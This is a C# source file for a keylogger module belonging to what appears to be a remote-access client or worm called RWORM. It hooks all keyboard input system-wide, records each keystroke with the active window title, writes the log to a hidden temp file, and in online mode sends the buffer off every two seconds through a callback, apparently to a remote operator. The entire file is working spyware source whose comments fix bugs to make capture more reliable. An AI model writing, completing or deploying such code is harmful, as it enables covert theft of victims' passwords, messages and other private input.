using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RWORM.Client.Modules
{
    /// <summary>
    /// Low-level keyboard hook keylogger.
    /// Offline mode: always appends to temp file.
    /// Online mode: also flushes buffer via OnFlush every 2 s.
    /// </summary>
    public class Keylogger : IDisposable
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN     = 0x0100;
        private const int WM_KEYUP       = 0x0101;
        private const int WM_SYSKEYDOWN  = 0x0104;
        private const int WM_SYSKEYUP    = 0x0105;
        private const uint WM_QUIT       = 0x0012;

        [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, KeyboardProc cb, IntPtr mod, uint tid);
        [DllImport("user32.dll")] static extern bool   UnhookWindowsHookEx(IntPtr h);
        [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);
        [DllImport("user32.dll")] static extern bool   GetMessage(out MSG m, IntPtr hwnd, uint min, uint max);
        [DllImport("user32.dll")] static extern bool   TranslateMessage(ref MSG m);
        [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG m);
        [DllImport("user32.dll")] static extern bool   PostThreadMessage(uint tid, uint msg, IntPtr w, IntPtr l);
        [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] static extern int    GetWindowText(IntPtr h, StringBuilder s, int n);
        [DllImport("user32.dll")] static extern short  GetKeyState(int nVirtKey);
        [DllImport("kernel32.dll")] static extern uint GetCurrentThreadId();

        delegate IntPtr KeyboardProc(int n, IntPtr w, IntPtr l);

        [StructLayout(LayoutKind.Sequential)]
        struct KBDLLHOOKSTRUCT { public int vkCode, scanCode, flags, time; public IntPtr extra; }

        [StructLayout(LayoutKind.Sequential)]
        struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam, lParam; public uint time; public int x, y; }

        private KeyboardProc? _proc;
        private IntPtr        _hook = IntPtr.Zero;
        private Thread?       _thread;
        private uint          _threadId;
        private readonly StringBuilder _buf = new StringBuilder();
        private readonly object        _lck = new object();
        private string _lastWindow = "";
        private bool   _running;

        // Modifier state — needed so letters render with correct case and
        // shifted symbols resolve to their real characters. Without this the
        // log was all-caps and Shift/Ctrl appeared as raw hex noise.
        private bool   _shift, _caps, _ctrl, _alt;

        public static readonly string OfflineLogPath =
            Path.Combine(Path.GetTempPath(), "rworm_kl.dat");

        /// Called with buffered data in online mode.
        public Func<string, Task>? OnFlush { get; set; }

        public bool IsRunning => _running;

        public void Start(bool onlineMode)
        {
            if (_running) return;
            _running = true;

            _thread = new Thread(() =>
            {
                _threadId = GetCurrentThreadId();
                _proc     = HookProc;

                // WH_KEYBOARD_LL: the module handle is ignored by the OS, and in
                // a single-file publish Marshal.GetHINSTANCE returns -1 (the
                // assembly has no file on disk), which made hook installation
                // fail silently. Pass NULL — the documented value for LL hooks.
                _hook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, IntPtr.Zero, 0);
                if (_hook == IntPtr.Zero)
                {
                    // Fallback: retry with the real module handle for the rare
                    // OS build that rejects a NULL hMod for this hook type.
                    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc,
                        Marshal.GetHINSTANCE(typeof(Keylogger).Module), 0);
                }

                while (_running && GetMessage(out var msg, IntPtr.Zero, 0, 0))
                {
                    TranslateMessage(ref msg);
                    DispatchMessage(ref msg);
                }

                if (_hook != IntPtr.Zero) { UnhookWindowsHookEx(_hook); _hook = IntPtr.Zero; }
            });
            _thread.IsBackground = true;
            _thread.Start();

            if (onlineMode)
            {
                _ = Task.Run(async () =>
                {
                    while (_running)
                    {
                        await Task.Delay(2000);
                        string data;
                        lock (_lck) { data = _buf.ToString(); _buf.Clear(); }
                        if (!string.IsNullOrEmpty(data) && OnFlush != null)
                        {
                            try { await OnFlush(data); } catch { }
                        }
                    }
                });
            }
        }

        public void Stop()
        {
            if (!_running) return;
            _running = false;

            // Wake the hook thread's message loop so it can unhook and exit.
            // If the thread never reached GetMessage (Start raced) the flag
            // alone still stops the flush loop and the hook is abandoned.
            if (_threadId != 0)
                try { PostThreadMessage(_threadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero); } catch { }

            _thread?.Join(1000);
            _threadId = 0;
        }

        /// Returns full offline log content (for "Offline" button in GUI).
        public string GetOfflineLog()
        {
            try { return File.Exists(OfflineLogPath) ? File.ReadAllText(OfflineLogPath) : "(empty)"; }
            catch { return "(read error)"; }
        }

        private IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && ((int)wParam == WM_KEYDOWN || (int)wParam == WM_SYSKEYDOWN))
            {
                var kb = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
                int vk = kb.vkCode;

                // Keep modifier state in sync so we can resolve letter case
                // and shifted symbols. We intentionally do NOT log the
                // modifier keys themselves — the old code emitted them as raw
                // hex ([10], [A0], ...) which polluted every line.
                switch (vk)
                {
                    case 0x10: case 0xA0: case 0xA1: _shift = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
                    case 0x11: case 0xA2: case 0xA3: _ctrl  = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
                    case 0x12: case 0xA4: case 0xA5: _alt   = true; return CallNextHookEx(_hook, nCode, wParam, lParam);
                    case 0x14: _caps = !_caps; return CallNextHookEx(_hook, nCode, wParam, lParam);
                }

                var sb  = new StringBuilder(256);
                var win = GetForegroundWindow();
                GetWindowText(win, sb, 256);
                string window = sb.ToString();

                var entry = new StringBuilder();
                if (!string.IsNullOrEmpty(window) && window != _lastWindow)
                {
                    entry.Append($"\r\n[{DateTime.Now:HH:mm} — {window}]\r\n");
                    _lastWindow = window;
                }
                entry.Append(VkToStr(vk));

                lock (_lck)
                {
                    _buf.Append(entry);
                    try { File.AppendAllText(OfflineLogPath, entry.ToString()); } catch { }
                }
            }
            else if (nCode >= 0 && ((int)wParam == WM_KEYUP || (int)wParam == WM_SYSKEYUP))
            {
                var kb = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
                switch (kb.vkCode)
                {
                    case 0x10: case 0xA0: case 0xA1: _shift = false; break;
                    case 0x11: case 0xA2: case 0xA3: _ctrl  = false; break;
                    case 0x12: case 0xA4: case 0xA5: _alt   = false; break;
                }
            }
            return CallNextHookEx(_hook, nCode, wParam, lParam);
        }

        private string VkToStr(int vk)
        {
            // Letters — VK codes are case-insensitive, so derive case from
            // Shift XOR CapsLock. Without this every letter logged as caps.
            if (vk >= 0x41 && vk <= 0x5A)
            {
                bool upper = _shift ^ _caps;
                return ((char)(upper ? vk : vk + 32)).ToString();
            }

            // Number row — Shift produces the symbols shown.
            if (vk >= 0x30 && vk <= 0x39)
            {
                if (_shift)
                {
                    // 0-9 with shift: ) ! @ # $ % ^ & * (
                    var shifted = ")!@#$%^&*(";
                    return shifted[vk - 0x30].ToString();
                }
                return ((char)vk).ToString();
            }

            if (vk >= 0x60 && vk <= 0x69) return ((char)('0' + vk - 0x60)).ToString(); // numpad

            // OEM / punctuation keys — apply Shift where it changes the glyph.
            switch (vk)
            {
                case 0x20: return " ";
                case 0x0D: return "\r\n";
                case 0x08: return "[BS]";
                case 0x09: return "[Tab]";
                case 0x1B: return "[Esc]";
                case 0x2E: return "[Del]";
                case 0x2D: return "[Ins]";
                case 0x25: return "[←]";
                case 0x26: return "[↑]";
                case 0x27: return "[→]";
                case 0x28: return "[↓]";
                case 0x24: return "[Home]";
                case 0x23: return "[End]";
                case 0x21: return "[PgUp]";
                case 0x22: return "[PgDn]";
                case 0x90: return "[Num]";
                case 0x14: return "[Caps]";
                case 0x5B: case 0x5C: return "[Win]";
                case 0xBC: return _shift ? "<" : ",";
                case 0xBE: return _shift ? ">" : ".";
                case 0xBF: return _shift ? "?" : "/";
                case 0xBA: return _shift ? ":" : ";";
                case 0xDE: return _shift ? "\"" : "'";
                case 0xDB: return _shift ? "{" : "[";
                case 0xDD: return _shift ? "}" : "]";
                case 0xBD: return _shift ? "_" : "-";
                case 0xBB: return _shift ? "+" : "=";
                case 0xDC: return _shift ? "|" : "\\";
                case 0xC0: return _shift ? "~" : "`";
                default:
                    if (vk >= 0x70 && vk <= 0x87) return $"[F{vk - 0x6F}]"; // F1-F24
                    return $"[{vk:X2}]";
            }
        }

        public void Dispose() => Stop();
    }
}
